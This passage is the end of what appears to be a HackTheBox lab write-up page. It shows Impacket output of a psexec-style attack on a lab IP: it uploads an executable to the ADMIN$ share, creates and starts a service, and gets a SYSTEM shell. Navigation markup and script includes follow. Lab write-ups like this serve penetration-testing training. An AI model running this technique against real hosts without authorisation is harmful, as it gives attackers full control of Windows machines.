Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.26.138.....
[*] Found writable share ADMIN$
[*] Uploading file utTnUhwK.exe
[*] Opening SVCManager on 10.129.26.138.....
[*] Creating service phSx on 10.129.26.138.....
[*] Starting service phSx.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.3453]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt; whoami
nt authority\system
</code></pre>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../../HackTheBox/Windows/Easy/Active.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>


                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../../HackTheBox/Windows/Easy/Active.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../../elasticlunr.min.js"></script>
        <script src="../../../mark.min.js"></script>
        <script src="../../../searcher.js"></script>

        <script src="../../../clipboard.min.js"></script>
        <script src="../../../highlight.js"></script>
        <script src="../../../book.js"></script>

        <!-- Custom JS scripts -->



    </div>
    </body>
</html>
